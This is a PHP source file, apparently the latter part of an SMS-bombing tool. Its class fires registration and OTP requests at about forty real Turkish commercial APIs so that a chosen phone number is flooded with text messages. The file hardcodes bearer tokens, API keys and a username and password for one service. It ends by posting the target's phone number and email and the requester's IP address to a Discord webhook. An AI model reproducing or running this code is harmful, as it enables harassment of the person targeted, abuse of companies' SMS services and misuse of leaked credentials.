"Authorization" => "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM",
"Origin" => "https://www.hayatsu.com.tr",
"Dnt" => "1",
"Sec-Gpc" => "1",
"Sec-Fetch-Dest" => "empty",
"Sec-Fetch-Mode" => "cors",
"Sec-Fetch-Site" => "same-site",
"Te" => "trailers"
);
$data = http_build_query(array("mobilePhoneNumber" => $this->phone, "actionType" => "register"));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$response = json_decode($r, true);
if ($response["is_success"] === true) {
//echo "Başarılı! " . $this->phone . " --> api.hayatsu.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> api.hayatsu.com.tr<br>";
}
}

// Hizliecza
public function Hizliecza() {
try {
$url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP";
$headers = array(
"Accept" => "application/json",
"Content-Type" => "application/json",
"Accept-Encoding" => "gzip, deflate",
"User-Agent" => "hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0",
"Accept-Language" => "en-US,en;q=0.9",
"Authorization" => "Bearer null"
);
$data = json_encode(array("otpOperationType" => 2, "phoneNumber" => "+90" . $this->phone));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
$response = json_decode($r, true);
if ($response["isSuccess"] === true) {
//echo "Başarılı! " . $this->phone . " --> hizlieczaprodapi.hizliecza.net<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> hizlieczaprodapi.hizliecza.net<br>";
}
}

// Ipragaz
public function Ipragaz() {
try {
$url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp";
$headers = array(
"Content-Type" => "application/json",
"X-Api-Token" => "",
"Authorization" => "",
"App-Version" => "1.3.9",
"App-Lang" => "en",
"Accept" => "*/*",
"App-Name" => "ipragaz-mobile",
"Os" => "ios",
"Accept-Language" => "en-TR;q=1.0, tr-TR;q=0.9",
"Accept-Encoding" => "gzip, deflate",
"User-Agent" => "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4",
"App-Build" => "41",
"Os-Version" => "15.7.7",
"Udid" => "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8",
"Connection" => "close"
);
$json = json_encode(array(
"birthDate" => "2/7/2000",
"carPlate" => "31 ABC 31",
"mobileOtp" => "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63",
"name" => "Memati Bas",
"otp" => "",
"phoneNumber" => $this->phone,
"playerId" => ""
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["status"] === "success") {
//echo "Başarılı! " . $this->phone . " --> ipapp.ipragaz.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> ipapp.ipragaz.com.tr<br>";
}
}

// Metro
public function Metro() {
try {
$url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend";
$headers = array(
"Accept" => "*/*",
"Content-Type" => "application/json; charset=utf-8",
"Accept-Encoding" => "gzip, deflate",
"Applicationversion" => "2.1.1",
"Applicationplatform" => "2",
"User-Agent" => "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1",
"Accept-Language" => "en-TR;q=1.0, tr-TR;q=0.9",
"Connection" => "close"
);
$json = json_encode(array(
"methodType" => "2",
"mobilePhoneNumber" => "+90" . $this->phone
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["status"] === "success") {
//echo "Başarılı! " . $this->phone . " --> feature.metro-tr.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> feature.metro-tr.com<br>";
}
}

// Qumpara
public function Qumpara() {
try {
$url = "https://tr-api.fisicek.com:443/v1.3/auth/getOTP";
$headers = array(
"Accept" => "application/json",
"Content-Type" => "application/json",
"Accept-Encoding" => "gzip, deflate",
"User-Agent" => "qumpara/4.2.53 (iPhone; iOS 15.7.7; Scale/3.00)",
"Accept-Language" => "en-TR;q=1, tr-TR;q=0.9"
);
$json = json_encode(array(
"msisdn" => "+90" . $this->phone
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
//echo "Başarılı! " . $this->phone . " --> tr-api.fisicek.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> tr-api.fisicek.com<br>";
}
}

// Paybol
public function Paybol() {
try {
$url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms";
$headers = array(
"Accept" => "application/json",
"Content-Type" => "application/json",
"User-Agent" => "Paybol/1.2.1 (com.app.paybol; build:1; iOS 15.7.7) Alamofire/5.5.0",
"Accept-Language" => "en-TR;q=1.0, tr-TR;q=0.9",
"Accept-Encoding" => "gzip, deflate",
"Connection" => "close"
);
$json = json_encode(array(
"phone_number" => "90" . $this->phone
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["status"] === 0) {
//echo "Başarılı! " . $this->phone . " --> pyb-mobileapi.walletgate.io<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> pyb-mobileapi.walletgate.io<br>";
}
}

// Migros
public function Migros() {
try {
$url = "https://rest.migros.com.tr:443/sanalmarket/users/register/otp";
$headers = array(
"User-Agent" => "Migros/1917 CFNetwork/1335.0.3.4 Darwin/21.6.0",
"X-Device-Model" => "iPhone 31 Plus",
"X-Device-Type" => "MOBILE",
"X-Device-App-Screen" => "OTHER",
"X-Device-Language" => "tr-TR",
"X-Device-App-Version" => "10.6.13",
"X-Device-Current-Long" => "",
"X-Request-Identifier" => "FBE85947-6E31-49AC-AC8C-317B21D79E80",
"X-Device-Selected-Address-Lat" => "",
"X-Device-Platform-Version" => "15.8.0",
"X-Device-Current-Lat" => "",
"X-Device-Platform" => "IOS",
"X-Store-Ids" => "",
"X-Device-Longitude" => "",
"Accept-Language" => "tr-TR,tr;q=0.9",
"Accept" => "*/*",
"Content-Type" => "application/json",
"X-Device-Latitude" => "",
"Accept-Encoding" => "gzip, deflate, br",
"X-Device-Selected-Address-Long" => "",
"X-Device-Identifier" => "31CAAD3F-5B53-315B-9C6D-31310D86826C"
);
$json = json_encode(array(
"email" => $this->mail,
"phoneNumber" => $this->phone
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["successful"] === true) {
//echo "Başarılı! " . $this->phone . " --> rest.migros.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> rest.migros.com.tr<br>";
}
}

// File
public function File() {
try {
$url = "https://api.filemarket.com.tr:443/v1/otp/send";
$headers = array(
"Accept" => "*/*",
"Content-Type" => "application/json",
"User-Agent" => "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0",
"X-Os" => "IOS",
"X-Version" => "1.7",
"Accept-Language" => "en-US,en;q=0.9",
"Accept-Encoding" => "gzip, deflate"
);
$json = json_encode(array(
"mobilePhoneNumber" => "90" . $this->phone
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["responseType"] === "SUCCESS") {
//echo "Başarılı! " . $this->phone . " --> api.filemarket.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> api.filemarket.com.tr<br>";
}
}

// Joker
public function Joker() {
try {
$url = "https://api.joker.com.tr:443/api/register";
$headers = array(
"Accept" => "*/*",
"Content-Type" => "application/json",
"Authorization" => "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4F5qftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds",
"Accept-Encoding" => "gzip, deflate",
"User-Agent" => "Joker/4.0.14 (com.joker.app; build:2; iOS 15.7.7) Alamofire/5.4.3",
"Accept-Language" => "en-TR;q=1.0, tr-TR;q=0.9",
"Connection" => "close"
);
$json = json_encode(array(
"firstName" => "Memati",
"gender" => "m",
"iosVersion" => "4.0.2",
"lastName" => "Bas",
"os" => "IOS",
"password" => "31ABC..abc31",
"phoneNumber" => "0" . $this->phone,
"username" => $this->mail
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["message"] === "Doğrulama kodu gönderildi.") {
//echo "Başarılı! " . $this->phone . " --> api.joker.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> api.joker.com.tr<br>";
}
}

// Akasya
public function Akasya() {
try {
$url = "https://akasya-admin.poilabs.com:443/v1/tr/sms";
$headers = array(
"Accept" => "*/*",
"Content-Type" => "application/json",
"X-Platform-Token" => "9f493307-d252-4053-8c96-62e7c90271f5",
"User-Agent" => "Akasya",
"Accept-Language" => "tr-TR;q=1.0, en-TR;q=0.9",
"Accept-Encoding" => "gzip, deflate, br"
);
$json = json_encode(array(
"phone" => $this->phone
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["result"] === "SMS sended succesfully!") {
//echo "Başarılı! " . $this->phone . " --> akasya-admin.poilabs.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> akasya-admin.poilabs.com<br>";
}
}

// Akbati
public function Akbati() {
try {
$url = "https://akbati-admin.poilabs.com:443/v1/tr/sms";
$headers = array(
"Accept" => "*/*",
"Content-Type" => "application/json",
"X-Platform-Token" => "a2fe21af-b575-4cd7-ad9d-081177c239a3",
"User-Agent" => "Akbat",
"Accept-Language" => "tr-TR;q=1.0, en-TR;q=0.9",
"Accept-Encoding" => "gzip, deflate, br"
);
$json = json_encode(array(
"phone" => $this->phone
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["result"] === "SMS sended succesfully!") {
//echo "Başarılı! " . $this->phone . " --> akbati-admin.poilabs.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> akbati-admin.poilabs.com<br>";
}
}

// Clickme
public function Clickme() {
try {
$url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code";
$headers = array(
"Content-Type" => "application/json",
"Authorization" => "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc",
"Client-Version" => "1.4.0",
"Client-Device" => "IOS",
"Accept-Language" => "tr-TR,tr;q=0.9",
"Accept-Encoding" => "gzip, deflate, br",
"User-Agent" => "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"
);
$json = json_encode(array(
"phone" => $this->phone
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["isSuccess"] === true) {
//echo "Başarılı! " . $this->phone . " --> mobile-gateway.clickmelive.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> mobile-gateway.clickmelive.com<br>";
}
}

// Happy
public function Happy() {
try {
$url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone";
$headers = array(
"Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8",
"Accept" => "application/json, text/javascript, */*; q=0.01",
"X-Requested-With" => "XMLHttpRequest",
"Accept-Language" => "en-US,en;q=0.9",
"Accept-Encoding" => "gzip, deflate",
"Origin" => "https://www.happy.com.tr",
"User-Agent" => "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
"Referer" => "https://www.happy.com.tr/index.php?route=account/register"
);
$data = http_build_query(array(
"telephone" => $this->phone
));
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($data) . "\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
if (strpos($http_response_header[0], "200") !== false) {
//echo "Başarılı! " . $this->phone . " --> happy.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> happy.com.tr<br>";
}
}

// Komagene
public function Komagene() {
try {
$url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder";
$json = json_encode(array(
"Telefon" => $this->phone,
"FirmaId" => "32"
));
$headers = array(
"user-agent" => "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
);
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["Success"] === true) {
//echo "Başarılı! " . $this->phone . " --> gateway.komagene.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> gateway.komagene.com.tr<br>";
}
}

// KuryemGelsin
public function KuryemGelsin() {
try {
$url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/";
$json = json_encode(array(
"phoneNumber" => $this->phone,
"phone_country_code" => "+90"
));
$options = array(
"http" => array(
"header" => "Content-Type: application/json\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
if ($http_response_header[0] === "HTTP/1.1 200 OK") {
//echo "Başarılı! " . $this->phone . " --> api.kuryemgelsin.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> api.kuryemgelsin.com<br>";
}
}

// Porty
public function Porty() {
try {
$url = "https://panel.porty.tech:443/api.php?";
$json = json_encode(array(
"job" => "start_login",
"phone" => $this->phone
));
$headers = array(
"Accept" => "*/*",
"Content-Type" => "application/json; charset=UTF-8",
"Accept-Encoding" => "gzip, deflate",
"Accept-Language" => "en-US,en;q=0.9",
"User-Agent" => "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
"Token" => "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"
);
$options = array(
"http" => array(
"header" => implode("\r\n", array_map(
function($v, $k) {
return $k . ":" . $v;
},
$headers,
array_keys($headers)
)) . "\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["status"] === "success") {
//echo "Başarılı! " . $this->phone . " --> panel.porty.tech<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> panel.porty.tech<br>";
}
}

// Taksim
public function Taksim() {
try {
$url = "https://service.taksim.digital:443/services/PassengerRegister/Register";
$json = json_encode(array(
"countryPhoneCode" => "+90",
"name" => "Memati",
"phoneNo" => $this->phone,
"surname" => "Bas"
));
$options = array(
"http" => array(
"header" => "Content-Type: application/json; charset=utf-8\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["success"] === true) {
//echo "Başarılı! " . $this->phone . " --> service.taksim.digital<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> service.taksim.digital<br>";
}
}

// Tasdelen
public function Tasdelen() {
try {
$url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend";
$json = json_encode(array(
"PhoneNumber" => $this->phone,
"user" => array(
"Password" => "Aa123!35@1",
"UserName" => "MobilOperator"
)
));
$options = array(
"http" => array(
"header" => "Content-Type: application/json\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["Result"] === true) {
//echo "Başarılı! " . $this->phone . " --> 94.102.66.162:80<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> 94.102.66.162:80<br>";
}
}

// Tasimacim
public function Tasimacim() {
try {
$url = "https://server.tasimacim.com/requestcode";
$json = json_encode(array(
"phone" => $this->phone,
"lang" => "tr"
));
$options = array(
"http" => array(
"header" => "Content-Type: application/json\r\n" . "Content-Length: " . strlen($json) . "\r\n",
"method" => "POST",
"content" => $json,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$http_response_header_parts = explode(" ", $http_response_header[0]);
if ($http_response_header_parts[1] == 200) {
//echo "Başarılı! " . $this->phone . " --> server.tasimacim.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> server.tasimacim.com<br>";
}
}

// ToptanTeslim
public function ToptanTeslim() {
try {
$url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx";
$data = array(
"ADRES" => "ZXNlZGtm",
"DIL" => "tr_TR",
"EPOSTA" => $this->mail,
"EPOSTA_BILDIRIM" => true,
"ILCE" => "BAŞAKŞEHİR",
"ISLEM" => "KayitOl",
"ISTEMCI" => "BEABC9B2-A58F-3131-AF46-2FF404F79677",
"KIMLIKNO" => null,
"KULLANICI_ADI" => "Memati",
"KULLANICI_SOYADI" => "Bas",
"PARA_BIRIMI" => "TL",
"PAROLA" => "312C6383DE1465D08F635B6121C1F9B4",
"POSTAKODU" => "377777",
"SEHIR" => "İSTANBUL",
"SEMT" => "BAŞAKŞEHİR MAH.",
"SMS_BILDIRIM" => true,
"TELEFON" => $this->phone,
"TICARI_UNVAN" => "kdkd",
"ULKE_ID" => 1105,
"VERGI_DAIRESI" => "sjje",
"VERGI_NU" => ""
);
$options = array(
"http" => array(
"header" => "Content-type: application/x-www-form-urlencoded\r\n",
"method" => "POST",
"content" => http_build_query($data),
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
$response = json_decode($r, true);
if ($response["Durum"] === true) {
//echo "Başarılı! " . $this->phone . " --> toptanteslim.com<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> toptanteslim.com<br>";
}
}

// Uysal
public function Uysal() {
try {
$url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms";
$data = json_encode(array("phone_number" => $this->phone));
$options = array(
"http" => array(
"header" => "Content-type: application/json\r\n",
"method" => "POST",
"content" => $data,
"timeout" => 6
)
);
$context = stream_context_create($options);
$r = file_get_contents($url, false, $context);
if ($r !== false) {
//echo "Başarılı! " . $this->phone . " --> api.uysalmarket.com.tr<br>";
$this->adet += 1;
} else {
throw new Exception();
}
} catch (Exception $e) {
//echo "Başarılı! " . $this->phone . " --> api.uysalmarket.com.tr<br>";
}
}


}

// Kullanım:
if ($_SERVER["REQUEST_METHOD"] == "POST") {
// SMSBot sınıfını oluştur
$smsBot = new SMSBot();

// Form verilerinden telefonu ve Değeri ayarlayın
$smsBot->phone = $_POST["phone"];
$smsBot->adet = $_POST["Value"];

// Email girildiğini kontrol et
if (!empty($_POST["email"])) {
$smsBot->mail = $_POST["email"];
} else {
// Rastgele email oluştur
$smsBot->mail = generateRandomEmail();
}

// Apileri çağır
$smsBot->KahveDunyasi();
$smsBot->Wmf();
$smsBot->Bim();
$smsBot->Englishhome();
$smsBot->Icq();
$smsBot->Suiste();
$smsBot->KimGb();
$smsBot->Tazi();
$smsBot->Evidea();
$smsBot->Hey();
$smsBot->Bisu();
$smsBot->Ucdortbes();
$smsBot->Macro();
$smsBot->TiklaGelsin();
$smsBot->Ayyildiz();
$smsBot->Naosstars();
$smsBot->Istegelsin();
$smsBot->Koton();
$smsBot->Hayatsu();
$smsBot->Hizliecza();
$smsBot->Ipragaz();
$smsBot->Metro();
$smsBot->Qumpara();
$smsBot->Paybol();
$smsBot->Migros();
$smsBot->File();
$smsBot->Joker();
$smsBot->Akasya();
$smsBot->Akbati();
$smsBot->Clickme();
$smsBot->Happy();
$smsBot->Komagene();
$smsBot->KuryemGelsin();
$smsBot->Porty();
$smsBot->Taksim();
$smsBot->Tasdelen();
$smsBot->Tasimacim();
$smsBot->ToptanTeslim();
$smsBot->Uysal();
$smsBot->Porty();

// Discord Webhook'a mesaj gönder
$discordWebhookURL = 'https://discord.com/api/webhooks/1151138212929089606/3WRurq-6JJx2EmVqZghENtzw4unSzl-CbAE_mrTflOVTMRATAUxz86R9FtPrGAjj6VbI';
$ipAddress = $_SERVER['REMOTE_ADDR'];
$message = "Sms Gönderimi Başarıyla tamamlandı\nPhone: " . $smsBot->phone . "\nMail: " . $smsBot->mail . "\nAdet: " . $smsBot->adet . "\nIP Adresi: " . $ipAddress;
$payload = json_encode(array('content' => $message));

$options = array(
'http' => array(
'header' => "Content-Type: application/json\r\n",
'method' => 'POST',
'content' => $payload
)
);
$context = stream_context_create($options);
$result = file_get_contents($discordWebhookURL, false, $context);

}
?>